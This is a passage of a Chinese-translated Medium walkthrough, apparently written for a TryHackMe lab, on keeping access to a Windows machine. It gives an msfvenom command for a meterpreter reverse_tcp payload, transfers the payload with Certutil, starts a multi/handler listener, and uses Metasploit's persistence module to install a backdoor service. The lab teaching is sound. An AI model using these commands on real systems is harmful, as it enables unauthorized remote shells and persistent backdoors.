class="gh gi nj"><img src="../Images/f15b289dc454506bc4e5ae43512810f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lb3_mRG2FvPnAIlS_G1FHg.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">Sql用户</figcaption></figure></div><div class="ab cl mo mp hu mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="ij ik il im in"><p id="1d31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">维护访问:</strong></p><p id="116f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有许多方法可以保持对机器或网络的访问。我们将介绍一种相对简单的保持访问的方法，首先配置一个meterpreter shell，然后使用persistence Metasploit模块在系统中创建一个后门服务，如果机器关闭或重置，它将为我们提供一个即时的meterpreter shell。</p><p id="c193" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">也有其他保持访问的方法，如复杂的后门和rootkits，但不在本会议室的讨论范围内。</p><p id="fa93" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">与其他作业相比，这将需要更多的手动设置，因此建议预先了解msfvenom和Metasploit。</p><p id="9b59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">步骤1:使用msfvenom生成有效负载:</p><ol class=""><li id="8944" class="nk nl iq jp b jq jr ju jv jy nm kc nn kg no kk np nq nr ns bi translated"><code class="fe mg mh mi kq b">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe</code>这将生成一个基本的windows meterpreter反向tcp shell。</li></ol><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/5730f9ea71ff2882353b92683cb90af6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a_NAqKRDwvzpPeJDCN6j2w.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">MSF病毒组</figcaption></figure><p id="3815" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.将有效负载从攻击机器转移到目标机器。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/9d5c279b3b2777b76a82b94e4c93cfbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JHQKhTxl09-TxZDlOl9TAQ.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">http服务器</figcaption></figure><p id="d170" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用Certutil或Invoke-WebRequest命令来接收文件。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/c6ec1460f3777aaa55e8a346abf3388d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VBQvCb25ieMrbcTbtKqbWw.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">Certutil</figcaption></figure><p id="dd40" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.<code class="fe mg mh mi kq b">use exploit/multi/handler</code> -这将在您设置的端口上创建一个监听器。</p><p id="4886" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.将我们的有效负载配置为一个windows meterpreter shell: <code class="fe mg mh mi kq b">set payload windows/meterpreter/reverse_tcp</code></p><p id="1262" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.将你的THM IP地址设置为“LHOST”后，用<code class="fe mg mh mi kq b">run</code>启动监听器</p><p id="8a1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.在windows机器上执行二进制文件将会在您的主机上返回一个meterpreter shell让我们回到这个话题</p><p id="64c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.验证我们已经获得了一个meterpreter shell，然后我们将在其中<code class="fe mg mh mi kq b">background</code>它来运行持久性模块。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/a71b6069dc44bb1d2e7c13893cb28d44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P4jnFZS6pdn1z8v9y26_ng.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">抄表员配置</figcaption></figure><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/7c1ba10780efc374a2474ef6da83d816.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WCxygeMV8BfRqetlAG2R9w.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">会议</figcaption></figure><p id="57cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行持久性模块:</p><p id="d06d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.默认情况下，该模块每10秒发送一次有效载荷，不过你可以随意设置时间</p><p id="3d5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.<code class="fe mg mh mi kq b">set session 1</code>将会话设置为我们在meterpreter中后台化的会话(您可以使用Metasploit中的<code class="fe mg mh mi kq b">sessions</code>命令来列出活动会话)</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/ecb52c2f3c18119dd4ee57d9ab42369c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9lEBFFuUbIOnZO8BCPGQRQ.png"/></div></div></figure><p id="294f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果系统出于任何原因关闭或重置，您将会丢失您的meterpreter会话；但是，通过使用持久性模块，您可以创建一个进入系统的后门，您可以通过使用Metasploit multi handler并将有效负载设置为windows/meterpreter/reverse tcp来随时访问该后门，从而允许您向计算机发送另一个meterpreter有效负载并打开一个新的meterpreter会话。</p><figure class="kl km kn ko gt la"><div class="bz fp l di"><div class="nt lc l"/></div></figure><p id="b7d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回头见。</p><p id="c9bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">黑客快乐！</p></div><div class="ab cl mo mp hu mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="ij ik il im in"><p id="a6c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。 <a class="ae nu" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mz">加入我们的每周简讯</em> </strong> </a> <em class="mz">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>